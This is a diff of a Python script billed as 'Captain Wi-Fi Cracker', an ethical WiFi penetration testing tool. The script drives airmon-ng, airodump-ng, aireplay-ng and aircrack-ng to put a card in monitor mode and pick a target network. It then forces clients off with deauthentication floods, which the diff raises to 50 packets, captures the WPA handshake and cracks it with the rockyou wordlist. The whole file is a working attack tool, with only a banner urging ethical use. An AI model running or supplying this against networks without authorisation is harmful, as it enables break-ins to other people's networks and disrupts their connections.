@@ -1,36 +1,46 @@
+#!/usr/bin/env python3
 import subprocess
 import re
 import os
 import time
+import sys
 import shutil
-import textwrap
 
 def display_intro():
-    ascii_art = r'''
-     ____            _        _        __        ___       _____ _    ____                _              
-    / ___|__ _ _ __ | |_ __ _(_)_ __   \ \      / (_)     |  ___(_)  / ___|_ __ __ _  ___| | _____ _ __  
-   | |   / _` | '_ \| __/ _` | | '_ \   \ \ /\ / /| |_____| |_  | | | |   | '__/ _` |/ __| |/ / _ \ '__| 
-   | |__| (_| | |_) | || (_| | | | | |   \ V  V / | |_____|  _| | | | |___| | | (_| | (__|   <  __/ |    
-    \____\__,_| .__/ \__\__,_|_|_| |_|    \_/\_/  |_|     |_|   |_|  \____|_|  \__,_|\___|_|\_\___|_|    
-              |_|                                                                                       
-    '''
-    header = """
-    ####################################################################################################
-    #                                       Captain Wi-Fi Cracker                                      #
-    #                               Ethical WiFi Penetration Testing Tool                              #
-    #                                          Author: Nandu10                                         #
-    #                           LinkedIn: https://linkedin.com/in/nandu-krishna-                       #
-    ####################################################################################################
-
-                                Hacking is an art — use your skills ethically!
+    terminal_width = shutil.get_terminal_size().columns  # Get current terminal width
+    ascii_art = r"""
+    ____            _        _        __        ___       _____ _    ____                _              
+   / ___|__ _ _ __ | |_ __ _(_)_ __   \ \      / (_)     |  ___(_)  / ___|_ __ __ _  ___| | _____ _ __  
+  | |   / _` | '_ \| __/ _` | | '_ \   \ \ /\ / /| |_____| |_  | | | |   | '__/ _` |/ __| |/ / _ \ '__| 
+  | |__| (_| | |_) | || (_| | | | | |   \ V  V / | |_____|  _| | | | |___| | | (_| | (__|   <  __/ |    
+   \____\__,_| .__/ \__\__,_|_|_| |_|    \_/\_/  |_|     |_|   |_|  \____|_|  \__,_|\___|_|\_\___|_|    
+             |_|                                                                                         
     """
-    print(ascii_art)
-    print(textwrap.dedent(header))
+
+    intro_text = """
+                               ############################################################
+                               #                  Captain Wi-Fi Cracker                  #
+                               #         Ethical WiFi Penetration Testing Tool           #
+                               #                      Author: Nandu10                    #
+                               #  LinkedIn: https://linkedin.com/in/nandu-krishna-       #
+                               ############################################################
+
+                             Hacking is an art — use your skills ethically!
+    """
+
+    # Center the ASCII art and text
+    print(ascii_art.center(terminal_width))
+    print(intro_text.center(terminal_width))
+
+
 
 def get_wifi_cards():
     print("[*] Scanning for WiFi cards...")
-    out = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
-    cards = re.findall(r'^(\w+)\s+IEEE 802.11', out.stdout, re.M)
+    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
+    cards = re.findall(r'^(\w+)\s+IEEE 802.11', result.stdout, re.M)
+    if not cards:
+        print("[!] No compatible WiFi cards auto-detected.")
+        cards = ['wlan0']  # Manual fallback
     return cards
 
 def pick_card(cards):
@@ -42,92 +52,104 @@ def pick_card(cards):
             choice = int(input("Choose your WiFi card: "))
             if 0 <= choice < len(cards):
                 return cards[choice]
-            else:
-                print("Invalid selection. Try again.")
         except ValueError:
-            print("Invalid input. Enter a number.")
+            pass
+        print("Invalid selection. Try again.")
 
-def start_monitor(card):
+def start_monitor_mode(card):
     print(f"[*] Enabling monitor mode on {card}...")
     subprocess.run(['airmon-ng', 'start', card])
-    return card + "mon"
+    time.sleep(2)
+
+    out = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True).stdout
+    matches = re.findall(r'^(\w+).*Mode:Monitor', out, re.M)
+
+    if matches:
+        print(f"[+] Monitor mode enabled on: {matches[0]}")
+        return matches[0]
+    else:
+        print("[-] Failed to enter monitor mode.")
+        sys.exit(1)
 
 def scan_wifi(mon_card):
     print(f"[*] Starting scan on {mon_card}. Press Ctrl+C to stop.")
     try:
         subprocess.run(['airodump-ng', mon_card])
     except KeyboardInterrupt:
-        print("\n[!] Scan stopped. Note down BSSID and Channel.")
+        print("\n[*] Scan interrupted.")
 
-def get_handshake(mon_card, bssid, ch):
-    os.makedirs("handshakes", exist_ok=True)
-    savefile = f"handshakes/{bssid.replace(':', '-')}"
+def get_handshake(mon_card, bssid, channel):
+    folder = "handshakes"
+    os.makedirs(folder, exist_ok=True)
+    savefile = f"{folder}/{bssid.replace(':', '-')}"
 
-    print("[*] Launching airodump-ng to capture handshake...")
-    dump_cmd = ['airodump-ng', '-c', ch, '--bssid', bssid, '-w', savefile, mon_card]
-    proc = subprocess.Popen(dump_cmd)
+    print("[*] Capturing handshake...")
+    proc = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', savefile, mon_card])
 
     time.sleep(5)
     print("[*] Sending deauth packets...")
-    subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, mon_card])
+    # Increased deauth packets to ensure the client reconnects
+    subprocess.run(['aireplay-ng', '--deauth', '50', '-a', bssid, mon_card], stdout=subprocess.DEVNULL)
 
-    print("[*] Waiting for handshake (20 sec)... Press Ctrl+C to interrupt.")
     try:
-        time.sleep(20)
+        # Increased the capture time to 60 seconds to ensure enough time for the handshake
+        time.sleep(60)
     except KeyboardInterrupt:
-        print("[!] Capture interrupted.")
+        print("[*] Early stop requested.")
 
     proc.terminate()
-    cap_file = savefile + "-01.cap"
-    print(f"[+] Capture saved to: {cap_file}")
+    capfile = savefile + "-01.cap"
+    print(f"[+] Handshake saved to {capfile}")
+    return capfile
 
-    return cap_file
+def ensure_wordlist_exists(path):
+    if os.path.isfile(path):
+        return path
+    elif os.path.isfile(path + ".gz"):
+        print("[*] Wordlist is gzipped. Unzipping now...")
+        subprocess.run(['gunzip', path + ".gz"])
+        return path
+    else:
+        return None
 
-def crack_it(capfile):
+def crack_handshake(capfile):
     print("\nChoose a wordlist option:")
     print("1. Use default rockyou.txt")
     print("2. Enter custom path")
+    choice = input("Select [1 or 2]: ").strip()
+    if choice == "1":
+        wordlist = "/usr/share/wordlists/rockyou.txt"
+    elif choice == "2":
+        wordlist = input("Enter full path to your wordlist: ").strip()
+    else:
+        print("[-] Invalid option. Using default rockyou.txt")
+        wordlist = "/usr/share/wordlists/rockyou.txt"
 
-    while True:
-        choice = input("Select [1 or 2]: ").strip()
-        if choice == "1":
-            if not os.path.isfile("/usr/share/wordlists/rockyou.txt"):
-                if os.path.isfile("/usr/share/wordlists/rockyou.txt.gz"):
-                    print("[*] Unzipping rockyou.txt.gz...")
-                    subprocess.run(['gunzip', '/usr/share/wordlists/rockyou.txt.gz'])
-            wordlist = "/usr/share/wordlists/rockyou.txt"
-            break
-        elif choice == "2":
-            wordlist = input("Enter path to your custom wordlist: ").strip()
-            if os.path.isfile(wordlist):
-                break
-            else:
-                print("[-] Wordlist file not found!")
-        else:
-            print("Invalid choice. Try again.")
+    wordlist = ensure_wordlist_exists(wordlist)
+    if not wordlist or not os.path.isfile(wordlist):
+        print("[-] Wordlist file not found!")
+        return
 
     print("[*] Cracking in progress...")
     subprocess.run(['aircrack-ng', '-w', wordlist, capfile])
 
 def main():
-    display_intro()
+    if os.geteuid() != 0:
+        print("[-] Run this script as root.")
+        sys.exit(1)
 
+    display_intro()
     cards = get_wifi_cards()
-    if not cards:
-        print("[-] No compatible WiFi cards found.")
-        return
 
     card = pick_card(cards)
-    mon_card = start_monitor(card)
-
+    mon_card = start_monitor_mode(card)
     scan_wifi(mon_card)
 
     bssid = input("Enter target BSSID: ").strip()
-    ch = input("Enter target channel: ").strip()
+    channel = input("Enter channel: ").strip()
 
-    capfile = get_handshake(mon_card, bssid, ch)
-
-    crack_it(capfile)
+    capfile = get_handshake(mon_card, bssid, channel)
+    crack_handshake(capfile)
 
 if __name__ == "__main__":
     main()
